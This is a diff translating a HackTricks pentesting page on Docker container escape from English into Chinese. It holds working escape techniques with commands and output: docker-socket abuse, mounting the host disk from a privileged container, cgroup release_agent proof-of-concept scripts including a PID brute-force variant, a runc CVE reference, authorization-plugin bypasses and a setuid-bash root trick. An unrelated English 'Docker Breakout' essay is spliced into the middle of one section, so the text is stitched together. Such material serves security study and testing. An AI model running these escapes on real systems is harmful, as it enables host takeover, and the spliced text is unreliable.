@@ -1,92 +1,80 @@
-
-
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
 
 </details>
 
 
-# What is a container
+# 什么是容器
 
-In summary, it's an **isolated** **process** via **cgroups** (what the process can use, like CPU and RAM) and **namespaces** (what the process can see, like directories or other processes):
-
+简而言之，容器是通过**cgroups**（进程可以使用的资源，如CPU和RAM）和**namespaces**（进程可以看到的内容，如目录或其他进程）进行**隔离**的**进程**：
 ```bash
 docker run -dt --rm denial sleep 1234 #Run a large sleep inside a Debian container
 ps -ef | grep 1234 #Get info about the sleep process
 ls -l /proc/<PID>/ns #Get the Group and the namespaces (some may be uniq to the hosts and some may be shred with it)
 ```
+# 挂载的Docker套接字
 
-# Mounted docker socket
-
-If somehow you find that the **docker socket is mounted** inside the docker container, you will be able to escape from it.\
-This usually happen in docker containers that for some reason need to connect to docker daemon to perform actions.
-
+如果你发现**Docker套接字被挂载**在Docker容器内部，你将能够从中逃脱出来。\
+这通常发生在需要连接到Docker守护程序执行操作的Docker容器中。
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
 #It's usually in /run/docker.sock
 ```
-
-In this case you can use regular docker commands to communicate with the docker daemon:
-
+在这种情况下，您可以使用常规的docker命令与docker守护程序进行通信：
 ```bash
 #List images to use one
 docker images
 #Run the image mounting the host disk and chroot on it
 docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
 ```
-
 {% hint style="info" %}
-In case the **docker socket is in an unexpected place** you can still communicate with it using the **`docker`** command with the parameter **`-H unix:///path/to/docker.sock`**
+如果**docker套接字位于意外位置**，您仍然可以使用带有参数**`-H unix:///path/to/docker.sock`**的**`docker`**命令与其通信。
 {% endhint %}
 
-# Container Capabilities
+# 容器权限提升
 
-You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**
+您应该检查容器的权限，如果具有以下任何权限之一，您可能能够从中逃脱：**`CAP_SYS_ADMIN`**，**`CAP_SYS_PTRACE`**，**`CAP_SYS_MODULE`**，**`DAC_READ_SEARCH`**，**`DAC_OVERRIDE`**
 
-You can check currently container capabilities with:
-
+您可以使用以下命令检查当前容器的权限：
 ```bash
 capsh --print
 ```
-
-In the following page you can **learn more about linux capabilities** and how to abuse them:
+在下面的页面中，您可以了解有关Linux功能的更多信息以及如何滥用它们：
 
 {% content-ref url="linux-capabilities.md" %}
 [linux-capabilities.md](linux-capabilities.md)
 {% endcontent-ref %}
 
-# `--privileged` flag
+# `--privileged`标志
 
-The --privileged flag allows the container to have access to the host devices.
+`--privileged`标志允许容器访问主机设备。
 
-## I own Root
+## 我拥有Root权限
 
-Well configured docker containers won't allow command like **fdisk -l**. However on missconfigured docker command where the flag --privileged is specified, it is possible to get the privileges to see the host drive.
+配置良好的Docker容器不会允许执行像**fdisk -l**这样的命令。然而，在错误配置的Docker命令中指定了`--privileged`标志时，可以获得查看主机驱动器的特权。
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
-So to take over the host machine, it is trivial:
-
+因此，要接管主机机器是微不足道的：
 ```bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
+然后，你现在可以访问主机的文件系统，因为它被挂载在`/mnt/hola`文件夹中。
 
-And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola `folder.
-
-{% code title="Initial PoC" %}
+{% code title="初始 PoC" %}
 ```bash
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -100,9 +88,7 @@ echo "#!/bin/sh $1 >$t/o" >/c;
 chmod +x /c;
 sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
 ```
-{% endcode %}
-
-{% code title="Second PoC" %}
+{% code title="第二个 PoC" %}
 ```bash
 # On the host
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
@@ -130,35 +116,34 @@ head /output
 ```
 {% endcode %}
 
-The `--privileged` flag introduces significant security concerns, and the exploit relies on launching a docker container with it enabled. When using this flag, containers have full access to all devices and lack restrictions from seccomp, AppArmor, and Linux capabilities.
+`--privileged`标志引入了重大的安全问题，并且利用该漏洞需要启用该标志来启动一个docker容器。使用此标志时，容器可以完全访问所有设备，并且不受seccomp、AppArmor和Linux权限的限制。
 
-In fact, `--privileged` provides far more permissions than needed to escape a docker container via this method. In reality, the “only” requirements are:
+实际上，`--privileged`提供的权限远远超出了通过此方法逃逸docker容器所需的权限。实际上，“只有”以下要求：
 
-1. We must be running as root inside the container
-2. The container must be run with the `SYS_ADMIN` Linux capability
-3. The container must lack an AppArmor profile, or otherwise allow the `mount` syscall
-4. The cgroup v1 virtual filesystem must be mounted read-write inside the container
+1. 我们必须在容器内作为root用户运行
+2. 容器必须以`SYS_ADMIN` Linux权限运行
+3. 容器必须缺少AppArmor配置文件，或者允许`mount`系统调用
+4. 在容器内必须以读写方式挂载cgroup v1虚拟文件系统
 
-The `SYS_ADMIN` capability allows a container to perform the mount syscall (see [man 7 capabilities](https://linux.die.net/man/7/capabilities)). [Docker starts containers with a restricted set of capabilities](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) by default and does not enable the `SYS_ADMIN` capability due to the security risks of doing so.
+`SYS_ADMIN`权限允许容器执行`mount`系统调用（参见[man 7 capabilities](https://linux.die.net/man/7/capabilities)）。[Docker默认以受限的权限启动容器](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities)，并且不启用`SYS_ADMIN`权限，因为这样做存在安全风险。
 
-Further, Docker [starts containers with the `docker-default` AppArmor](https://docs.docker.com/engine/security/apparmor/#understand-the-policies) policy by default, which [prevents the use of the mount syscall](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) even when the container is run with `SYS_ADMIN`.
+此外，Docker默认使用`docker-default` AppArmor策略启动容器，即使容器以`SYS_ADMIN`权限运行，也[禁止使用`mount`系统调用](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35)。
 
-A container would be vulnerable to this technique if run with the flags: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`
+如果以`--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`标志运行容器，则容器将容易受到此技术的攻击。
 
-## Breaking down the proof of concept
+## 分解概念验证
 
-Now that we understand the requirements to use this technique and have refined the proof of concept exploit, let’s walk through it line-by-line to demonstrate how it works.
+现在我们了解了使用此技术的要求，并且已经完善了概念验证漏洞，让我们逐行解释它，以演示其工作原理。
 
-To trigger this exploit we need a cgroup where we can create a `release_agent` file and trigger `release_agent` invocation by killing all processes in the cgroup. The easiest way to accomplish that is to mount a cgroup controller and create a child cgroup.
+要触发此漏洞利用，我们需要一个cgroup，我们可以在其中创建一个`release_agent`文件，并通过杀死cgroup中的所有进程来触发`release_agent`调用。最简单的方法是挂载一个cgroup控制器并创建一个子cgroup。
 
-To do that, we create a `/tmp/cgrp` directory, mount the [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup controller and create a child cgroup (named “x” for the purposes of this example). While every cgroup controller has not been tested, this technique should work with the majority of cgroup controllers.
+为此，我们创建一个`/tmp/cgrp`目录，挂载[RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup控制器，并创建一个子cgroup（在本示例中命名为“x”）。虽然没有测试每个cgroup控制器，但这种技术应该适用于大多数cgroup控制器。
 
-If you’re following along and get “mount: /tmp/cgrp: special device cgroup does not exist”, it’s because your setup doesn’t have the RDMA cgroup controller. Change `rdma` to `memory` to fix it. We’re using RDMA because the original PoC was only designed to work with it.
+如果您正在跟随并出现“mount: /tmp/cgrp: special device cgroup does not exist”错误，那是因为您的设置没有RDMA cgroup控制器。将`rdma`更改为`memory`以修复它。我们使用RDMA是因为原始概念验证仅设计用于与其一起使用。
 
-Note that cgroup controllers are global resources that can be mounted multiple times with different permissions and the changes rendered in one mount will apply to another.
+请注意，cgroup控制器是全局资源，可以多次以不同的权限进行挂载，并且在一个挂载中进行的更改将应用于另一个挂载。
 
-We can see the “x” child cgroup creation and its directory listing below.
-
+我们可以看到下面的“x”子cgroup的创建及其目录列表。
 ```
 root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 root@b11cf9eab4fd:/# ls /tmp/cgrp/
@@ -166,28 +151,22 @@ cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  re
 root@b11cf9eab4fd:/# ls /tmp/cgrp/x
 cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
 ```
+接下来，我们通过向其`notify_on_release`文件写入1来在释放“x” cgroup时启用cgroup通知。我们还通过将主机上的`release_agent`文件写入`/cmd`脚本的路径来设置RDMA cgroup的释放代理——我们稍后将在容器中创建该脚本。为此，我们将从`/etc/mtab`文件中获取容器在主机上的路径。
 
-Next, we enable cgroup notifications on release of the “x” cgroup by writing a 1 to its `notify_on_release` file. We also set the RDMA cgroup release agent to execute a `/cmd` script — which we will later create in the container — by writing the `/cmd` script path on the host to the `release_agent` file. To do it, we’ll grab the container’s path on the host from the `/etc/mtab` file.
+我们在容器中添加或修改的文件存在于主机上，并且可以从两个世界（容器中的路径和主机上的路径）对它们进行修改。
 
-The files we add or modify in the container are present on the host, and it is possible to modify them from both worlds: the path in the container and their path on the host.
-
-Those operations can be seen below:
-
+这些操作如下所示：
 ```
 root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
 root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
-
-Note the path to the `/cmd` script, which we are going to create on the host:
-
+请注意我们将在主机上创建的 `/cmd` 脚本的路径：
 ```
 root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
 /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
 ```
-
-Now, we create the `/cmd` script such that it will execute the `ps aux` command and save its output into `/output` on the container by specifying the full path of the output file on the host. At the end, we also print the `/cmd` script to see its contents:
-
+现在，我们创建`/cmd`脚本，使其执行`ps aux`命令，并将其输出保存到容器中的`/output`文件中，通过指定主机上输出文件的完整路径。最后，我们还打印`/cmd`脚本以查看其内容：
 ```
 root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
 root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
@@ -196,9 +175,7 @@ root@b11cf9eab4fd:/# cat /cmd
 #!/bin/sh
 ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
 ```
-
-Finally, we can execute the attack by spawning a process that immediately ends inside the “x” child cgroup. By creating a `/bin/sh` process and writing its PID to the `cgroup.procs` file in “x” child cgroup directory, the script on the host will execute after `/bin/sh` exits. The output of `ps aux` performed on the host is then saved to the `/output` file inside the container:
-
+最后，我们可以通过在“x”子cgroup目录中生成一个立即结束的进程来执行攻击。通过创建一个`/bin/sh`进程并将其PID写入“x”子cgroup目录中的`cgroup.procs`文件，主机上的脚本将在`/bin/sh`退出后执行。然后，主机上执行的`ps aux`命令的输出将保存到容器内的`/output`文件中：
 ```
 root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 root@b11cf9eab4fd:/# head /output
@@ -213,41 +190,35 @@ root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
 root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
 root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
 ```
+# `--privileged`标志 v2
 
-# `--privileged` flag v2
-
-The previous PoCs work fine when the container is configured with a storage-driver which exposes the full host path of the mount point, for example `overlayfs`, however I recently came across a couple of configurations which did not obviously disclose the host file system mount point.
+之前的 PoC 在容器配置了一个存储驱动程序时可以正常工作，该驱动程序会公开挂载点的完整主机路径，例如 `overlayfs`，然而最近我遇到了一些配置，它们并没有明显地公开主机文件系统的挂载点。
 
 ## Kata Containers
-
 ```
 root@container:~$ head -1 /etc/mtab
 kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
 ```
+[Kata Containers](https://katacontainers.io) 默认情况下通过 `9pfs` 挂载容器的根文件系统。这不会泄露有关 Kata Containers 虚拟机中容器文件系统位置的任何信息。
 
-[Kata Containers](https://katacontainers.io) by default mounts the root fs of a container over `9pfs`. This discloses no information about the location of the container file system in the Kata Containers Virtual Machine.
+\* 关于 Kata Containers 的更多信息将在未来的博客文章中提到。
 
-\* More on Kata Containers in a future blog post.
-
-## Device Mapper
-
+## 设备映射器
 ```
 root@container:~$ head -1 /etc/mtab
 /dev/sdc / ext4 rw,relatime,stripe=384 0 0
 ```
+我在一个实时环境中看到了一个具有根挂载的容器，我相信该容器是使用特定的`devicemapper`存储驱动程序配置运行的，但是到目前为止，我无法在测试环境中复制这种行为。
 
-I saw a container with this root mount in a live environment, I believe the container was running with a specific `devicemapper` storage-driver configuration, but at this point I have been unable to replicate this behaviour in a test environment.
+## 另一种 PoC
 
-## An Alternative PoC
+显然，在这些情况下，没有足够的信息来确定容器文件在主机文件系统上的路径，因此无法直接使用 Felix 的 PoC。然而，我们仍然可以通过一些巧妙的方法执行这次攻击。
 
-Obviously in these cases there is not enough information to identify the path of container files on the host file system, so Felix’s PoC cannot be used as is. However, we can still execute this attack with a little ingenuity.
+唯一需要的关键信息是相对于容器主机的完整路径，用于在容器内执行的文件。如果无法从容器内的挂载点中确定这一点，我们必须寻找其他地方。
 
-The one key piece of information required is the full path, relative to the container host, of a file to execute within the container. Without being able to discern this from mount points within the container we have to look elsewhere.
+### 救命的 Proc <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>
 
-### Proc to the Rescue <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>
-
-The Linux `/proc` pseudo-filesystem exposes kernel process data structures for all processes running on a system, including those running in different namespaces, for example within a container. This can be shown by running a command in a container and accessing the `/proc` directory of the process on the host:Container
-
+Linux 的 `/proc` 伪文件系统公开了系统上运行的所有进程的内核进程数据结构，包括在不同命名空间中运行的进程，例如容器内部的进程。可以通过在容器中运行命令并访问主机上的进程的 `/proc` 目录来展示这一点：
 ```bash
 root@container:~$ sleep 100
 ```
@@ -271,17 +242,15 @@ lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
 -rw-r--r--   1 root root 0 Nov 19 10:29 sched
 ...
 ```
-
-_As an aside, the `/proc/<pid>/root` data structure is one that confused me for a very long time, I could never understand why having a symbolic link to `/` was useful, until I read the actual definition in the man pages:_
+_顺便提一下，`/proc/<pid>/root` 数据结构曾经让我困惑了很长时间，我一直无法理解为什么将符号链接指向 `/` 是有用的，直到我在 man 手册中读到了实际的定义：_
 
 > /proc/\[pid]/root
 >
-> UNIX and Linux support the idea of a per-process root of the filesystem, set by the chroot(2) system call. This file is a symbolic link that points to the process’s root directory, and behaves in the same way as exe, and fd/\*.
+> UNIX 和 Linux 支持每个进程的文件系统根目录的概念，通过 chroot(2) 系统调用进行设置。该文件是一个符号链接，指向进程的根目录，并且与 exe 和 fd/\* 的行为相同。
 >
-> Note however that this file is not merely a symbolic link. It provides the same view of the filesystem (including namespaces and the set of per-process mounts) as the process itself.
+> 但请注意，该文件不仅仅是一个符号链接。它提供了与进程本身相同的文件系统视图（包括命名空间和每个进程的挂载点集）。
 
-The `/proc/<pid>/root` symbolic link can be used as a host relative path to any file within a container:Container
-
+`/proc/<pid>/root` 符号链接可以用作容器内任何文件的主机相对路径：Container
 ```bash
 root@container:~$ echo findme > /findme
 root@container:~$ sleep 100
@@ -291,20 +260,60 @@ root@container:~$ sleep 100
 root@host:~$ cat /proc/`pidof sleep`/root/findme
 findme
 ```
-
-This changes the requirement for the attack from knowing the full path, relative to the container host, of a file within the container, to knowing the pid of _any_ process running in the container.
+这将攻击的要求从知道容器内文件相对于容器主机的完整路径，变为知道容器中任何进程的pid。
 
 ### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>
 
-This is actually the easy part, process ids in Linux are numerical and assigned sequentially. The `init` process is assigned process id `1` and all subsequent processes are assigned incremental ids. To identify the host process id of a process within a container, a brute force incremental search can be used:Container
-
+这实际上是容易的部分，Linux中的进程ID是数字，并按顺序分配。`init`进程被分配进程ID `1`，所有后续进程都被分配递增的ID。为了确定容器内进程的主机进程ID，可以使用暴力递增搜索：Container
 ```
 root@container:~$ echo findme > /findme
 root@container:~$ sleep 100
 ```
+主机
 
-Host
+---
 
+### Docker Breakout
+
+#### Introduction
+
+Docker is a popular containerization platform that allows you to run applications in isolated environments called containers. However, misconfigurations or vulnerabilities in Docker can lead to privilege escalation attacks, allowing an attacker to break out of the container and gain access to the underlying host system.
+
+This section will cover various techniques that can be used to break out of a Docker container and escalate privileges on the host system.
+
+#### Docker Socket
+
+The Docker daemon communicates with the Docker client through a Unix socket, which is typically located at `/var/run/docker.sock`. By default, this socket is owned by the `root` user and the `docker` group. If an attacker gains access to this socket, they can execute Docker commands with root privileges.
+
+To exploit this, an attacker can mount the host's Docker socket inside a container and then use it to interact with the Docker daemon. This can be done by running the container with the following command:
+
+```bash
+docker run -v /var/run/docker.sock:/var/run/docker.sock <image>
+```
+
+Once inside the container, the attacker can execute privileged Docker commands, such as creating new containers or even starting a new container with host-level privileges.
+
+#### Container Escape
+
+In some cases, it may be possible to escape the confines of a Docker container and gain access to the host system. This can be achieved through various techniques, such as exploiting kernel vulnerabilities or misconfigurations in the container runtime.
+
+One common technique is to mount the host's root filesystem inside the container and then modify critical system files to gain root access on the host. This can be done by running the container with the following command:
+
+```bash
+docker run -v /:/host <image>
+```
+
+Once inside the container, the attacker can navigate to the `/host` directory and modify system files as needed.
+
+#### Privilege Escalation
+
+Once an attacker has gained access to the host system, they can escalate their privileges to gain full control over the system. This can be done by exploiting vulnerabilities in the host's operating system or by leveraging misconfigurations in system services.
+
+Common privilege escalation techniques include exploiting weak file permissions, misconfigured sudo privileges, or vulnerable setuid binaries. By exploiting these vulnerabilities, an attacker can gain root access on the host system and perform any actions they desire.
+
+#### Conclusion
+
+Docker breakout attacks can be a serious security risk if Docker is not properly configured or if vulnerabilities are present in the host system. It is important to follow security best practices when using Docker and regularly update both the Docker software and the host system to mitigate these risks.
 ```bash
 root@host:~$ COUNTER=1
 root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
@@ -313,15 +322,13 @@ root@host:~$ echo ${COUNTER}
 root@host:~$ cat /proc/${COUNTER}/root/findme
 findme
 ```
+### 将所有内容整合在一起 <a href="putting-it-all-together" id="putting-it-all-together"></a>
 
-### Putting it All Together <a href="putting-it-all-together" id="putting-it-all-together"></a>
+为了完成这次攻击，可以使用暴力破解技术来猜测路径`/proc/<pid>/root/payload.sh`的pid，每次迭代将猜测的pid路径写入cgroups的`release_agent`文件，触发`release_agent`，并查看是否创建了输出文件。
 
-To complete this attack the brute force technique can be used to guess the pid for the path `/proc/<pid>/root/payload.sh`, with each iteration writing the guessed pid path to the cgroups `release_agent` file, triggering the `release_agent`, and seeing if an output file is created.
+这种技术的唯一注意事项是它绝对不是一个隐蔽的方法，并且可能会使pid计数非常高。由于没有长时间运行的进程保持运行，这 _应该_ 不会导致可靠性问题，但请不要引用我。
 
-The only caveat with this technique is it is in no way shape or form subtle, and can increase the pid count very high. As no long running processes are kept running this _should_ not cause reliability issues, but don’t quote me on that.
-
-The below PoC implements these techniques to provide a more generic attack than first presented in Felix’s original PoC for escaping a privileged container using the cgroups `release_agent` functionality:
-
+下面的PoC实现了这些技术，提供了一个比Felix原始PoC中使用cgroups `release_agent`功能逃逸特权容器更通用的攻击方法：
 ```bash
 #!/bin/sh
 
@@ -360,20 +367,20 @@ echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release
 TPID=1
 while [ ! -f ${OUTPUT_PATH} ]
 do
-  if [ $((${TPID} % 100)) -eq 0 ]
-  then
-    echo "Checking pid ${TPID}"
-    if [ ${TPID} -gt ${MAX_PID} ]
-    then
-      echo "Exiting at ${MAX_PID} :-("
-      exit 1
-    fi
-  fi
-  # Set the release_agent path to the guessed pid
-  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
-  # Trigger execution of the release_agent
-  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
-  TPID=$((${TPID} + 1))
+if [ $((${TPID} % 100)) -eq 0 ]
+then
+echo "Checking pid ${TPID}"
+if [ ${TPID} -gt ${MAX_PID} ]
+then
+echo "Exiting at ${MAX_PID} :-("
+exit 1
+fi
+fi
+# Set the release_agent path to the guessed pid
+echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
+# Trigger execution of the release_agent
+sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
+TPID=$((${TPID} + 1))
 done
 
 # Wait for and cat the output
@@ -381,9 +388,7 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
-
-Executing the PoC within a privileged container should provide output similar to:
-
+在具有特权的容器中执行PoC应该会提供类似的输出：
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -411,70 +416,62 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
+# Runc漏洞利用（CVE-2019-5736）
 
-# Runc exploit (CVE-2019-5736)
+如果你能以root身份执行`docker exec`（可能需要sudo），你可以尝试通过滥用CVE-2019-5736（漏洞[在这里](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)）来提升权限并从容器中逃脱。这种技术基本上会从容器中**覆盖**主机的_**/bin/sh**_二进制文件，因此任何执行docker exec的人都可能触发有效载荷。
 
-In case you can execute `docker exec` as root (probably with sudo), you try to escalate privileges escaping from a container abusing CVE-2019-5736 (exploit [here](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). This technique will basically **overwrite** the _**/bin/sh**_ binary of the **host** **from a container**, so anyone executing docker exec may trigger the payload.
-
-Change the payload accordingly and build the main.go with `go build main.go`. The resulting binary should be placed in the docker container for execution.\
-Upon execution, as soon as it displays `[+] Overwritten /bin/sh successfully` you need to execute the following from the host machine:
+根据需要修改有效载荷，并使用`go build main.go`构建main.go。生成的二进制文件应放置在docker容器中以供执行。\
+执行时，一旦显示`[+] Overwritten /bin/sh successfully`，你需要从主机机器上执行以下操作：
 
 `docker exec -it <container-name> /bin/sh`
 
-This will trigger the payload which is present in the main.go file.
+这将触发main.go文件中的有效载荷。
 
-For more information: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
+了解更多信息：[https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
-# Docker Auth Plugin Bypass
+# Docker身份验证插件绕过
 
-In some occasions, the sysadmin may install some plugins to docker to avoid low privilege users to interact with docker without being able to escalate privileges.
+在某些情况下，系统管理员可能会安装一些插件到docker中，以防止低权限用户在没有能力提升权限的情况下与docker进行交互。
 
-## disallowed `run --privileged`
+## 禁止`run --privileged`
 
-In this case the sysadmin **disallowed users to mount volumes and run containers with the `--privileged` flag** or give any extra capability to the container:
-
+在这种情况下，系统管理员**禁止用户使用`--privileged`标志挂载卷和运行容器**，或者给容器赋予任何额外的权限：
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-
-However, a user can **create a shell inside the running container and give it the extra privileges**:
-
+然而，用户可以在运行的容器内创建一个shell，并赋予它额外的权限：
 ```bash
 docker run -d --security-opt "seccomp=unconfined" ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
 docker exec -it --privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
 ```
+现在，用户可以使用之前讨论过的任何技术逃离容器，并在主机内提升权限。
 
-Now, the user can escape from the container using any of the previously discussed techniques and escalate privileges inside the host.
+## 挂载可写文件夹
 
-## Mount Writable Folder
-
-In this case the sysadmin **disallowed users to run containers with the `--privileged` flag** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
-
+在这种情况下，系统管理员**禁止用户使用`--privileged`标志运行容器**或为容器提供任何额外的能力，并且只允许挂载`/tmp`文件夹：
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
 docker container> chown root:root /host/bash
 docker container> chmod u+s /host/bash
 host> /tmp/bash
- -p #This will give you a shell as root
+-p #This will give you a shell as root
 ```
-
 {% hint style="info" %}
-Note that maybe you cannot mount the folder `/tmp` but you can mount a **different writable folder**. You can find writable directories using: `find / -writable -type d 2>/dev/null`
+请注意，您可能无法挂载`/tmp`文件夹，但可以挂载**其他可写文件夹**。您可以使用以下命令查找可写目录：`find / -writable -type d 2>/dev/null`
 
-**Note that not all the directories in a linux machine will support the suid bit!** In order to check which directories support the suid bit run `mount | grep -v "nosuid"` For example usually `/dev/shm` , `/run` , `/proc` , `/sys/fs/cgroup` and `/var/lib/lxcfs` don't support the suid bit.
+**请注意，并非Linux机器上的所有目录都支持suid位！**为了检查哪些目录支持suid位，请运行`mount | grep -v "nosuid"`。例如，通常`/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup`和`/var/lib/lxcfs`不支持suid位。
 
-Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges (maybe modifying `/etc/shadow`)
+还要注意，如果您可以**挂载`/etc`**或任何其他**包含配置文件**的文件夹，您可以作为root用户从docker容器中更改它们，以便在主机上**滥用它们**并提升权限（可能修改`/etc/shadow`）。
 {% endhint %}
 
-## Unchecked JSON Structure
+## 未经检查的JSON结构
 
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important parameter** of the API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) like "**Binds**".\
-In the following example it's possible to abuse this misconfiguration to create and run a container that mounts the root (/) folder of the host:
-
